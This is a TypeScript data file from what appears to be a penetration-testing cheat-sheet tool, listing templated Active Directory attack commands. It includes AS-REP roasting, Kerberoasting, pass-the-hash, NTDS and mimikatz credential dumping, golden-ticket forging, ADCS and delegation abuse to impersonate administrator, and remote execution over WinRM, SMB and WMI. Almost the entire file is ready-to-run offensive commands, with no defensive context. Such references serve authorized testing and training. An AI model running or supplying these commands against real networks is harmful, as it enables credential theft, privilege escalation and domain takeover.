import { Section } from "./types";

export const adSection: Section = {
  id: "ad",
  title: "Active Directory",
  slug: "ad",
  groups: [
    { title: "BloodHound", commands: [
      { id: "ad-1", cmd: "bloodhound-python -d {DOMAIN} -u {USER} -p {PASS} -ns {DC} -c all", description: "Collect BloodHound data.", tags: ["ad"], hasVars: true },
      { id: "ad-1a", cmd: "bloodhound-python -d {DOMAIN} -u {USER} -p {PASS} -ns {DC} -c dconly", description: "Fast DC-only collection.", tags: ["ad"], hasVars: true },
    ]},
    { title: "ASREPRoasting", commands: [
      { id: "ad-2", cmd: "GetNPUsers.py {DOMAIN}/ -dc-ip {DC} -usersfile users.txt -format hashcat -outputfile asrep.txt", description: "AS-REP roast users.", tags: ["ad"], hasVars: true },
      { id: "ad-2a", cmd: "GetNPUsers.py {DOMAIN}/{USER}:{PASS} -dc-ip {DC} -request -format hashcat", description: "Request AS-REP hashes directly.", tags: ["ad"], hasVars: true },
    ]},
    { title: "Kerberoasting", commands: [
      { id: "ad-3", cmd: "GetUserSPNs.py {DOMAIN}/{USER}:{PASS} -dc-ip {DC} -request", description: "Request SPN tickets.", tags: ["ad"], hasVars: true },
      { id: "ad-3a", cmd: "GetUserSPNs.py -request -dc-ip {DC} {DOMAIN}/{USER}:{PASS} -outputfile tgs.hashes", description: "Save Kerberoast hashes.", tags: ["ad"], hasVars: true },
    ]},
    { title: "Pass-the-Hash", commands: [
      { id: "ad-4", cmd: "impacket-psexec -hashes {HASH} {DOMAIN}/{USER}@{RHOST}", description: "PTH over SMB.", tags: ["ad"], hasVars: true },
      { id: "ad-4a", cmd: "impacket-wmiexec -hashes {HASH} {DOMAIN}/{USER}@{RHOST}", description: "PTH with WMI exec.", tags: ["ad"], hasVars: true },
      { id: "ad-4b", cmd: "crackmapexec smb {RHOST} -u {USER} -H {HASH}", description: "Validate NT hash auth.", tags: ["ad"], hasVars: true },
    ]},
    { title: "Credential Dumping", commands: [
      { id: "ad-5", cmd: "secretsdump.py {DOMAIN}/{USER}:{PASS}@{DC}", description: "Dump NTDS hashes.", tags: ["ad"], hasVars: true },
      { id: "ad-5a", cmd: "mimikatz \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", description: "Dump creds from memory.", tags: ["ad", "windows"] },
    ]},
    { title: "Golden/Silver Tickets", commands: [
      { id: "ad-6", cmd: "ticketer.py -nthash {HASH} -domain-sid {SID} -domain {DOMAIN} administrator", description: "Forge golden ticket.", tags: ["ad"], hasVars: true },
      { id: "ad-6a", cmd: "export KRB5CCNAME=administrator.ccache", description: "Use forged ticket ccache.", tags: ["ad"] },
    ]},
    { title: "ADCS Abuse", commands: [
      { id: "ad-7", cmd: "certipy find -u {USER}@{DOMAIN} -p {PASS} -dc-ip {DC} -vulnerable", description: "Find vulnerable ADCS templates.", tags: ["ad"], hasVars: true },
      { id: "ad-7a", cmd: "certipy req -u {USER}@{DOMAIN} -p {PASS} -dc-ip {DC} -ca {CA_NAME} -template {TEMPLATE} -upn administrator@{DOMAIN}", description: "Request cert for privileged UPN.", tags: ["ad"], hasVars: true },
      { id: "ad-7b", cmd: "certipy auth -pfx administrator.pfx -dc-ip {DC}", description: "Authenticate using forged certificate.", tags: ["ad"], hasVars: true },
    ]},
    { title: "Delegation Abuse", commands: [
      { id: "ad-8", cmd: "findDelegation.py {DOMAIN}/{USER}:{PASS} -dc-ip {DC}", description: "Enumerate delegation paths.", tags: ["ad"], hasVars: true },
      { id: "ad-8a", cmd: "getST.py -spn cifs/{RHOST}.{DOMAIN} -impersonate administrator {DOMAIN}/{USER}:{PASS} -dc-ip {DC}", description: "Abuse constrained delegation for service ticket.", tags: ["ad"], hasVars: true },
      { id: "ad-8b", cmd: "export KRB5CCNAME=administrator.ccache && smbclient -k //{RHOST}/c$", description: "Use delegated ticket for SMB access.", tags: ["ad"], hasVars: true },
    ]},
    { title: "Lateral Movement", commands: [
      { id: "ad-9", cmd: "evil-winrm -i {RHOST} -u {USER} -p {PASS}", description: "WinRM lateral movement with creds.", tags: ["ad", "windows"], hasVars: true },
      { id: "ad-9a", cmd: "impacket-smbexec {DOMAIN}/{USER}:{PASS}@{RHOST}", description: "Remote command exec over SMB.", tags: ["ad"], hasVars: true },
      { id: "ad-9b", cmd: "wmiexec.py {DOMAIN}/{USER}:{PASS}@{RHOST}", description: "WMI-based remote execution.", tags: ["ad"], hasVars: true },
    ]},
    {
      title: "External References (Local Exports)",
      commands: [
        { id: "ad-ref-adrecon", cmd: "adrecon_2026-03-29.txt", description: "Local reference export (HackTricks AD recon notes). Open the file locally; not a runnable command.", tags: ["all"] },
        { id: "ad-ref-adlat", cmd: "adlat_2026-03-29.txt", description: "Local reference export (HackTricks AD lateral movement notes). Open the file locally; not a runnable command.", tags: ["all"] },
        { id: "ad-ref-adatk", cmd: "adatk_2026-03-29.txt", description: "Local reference export (HackTricks AD attack notes). Open the file locally; not a runnable command.", tags: ["all"] },
      ],
    },
  ],
};
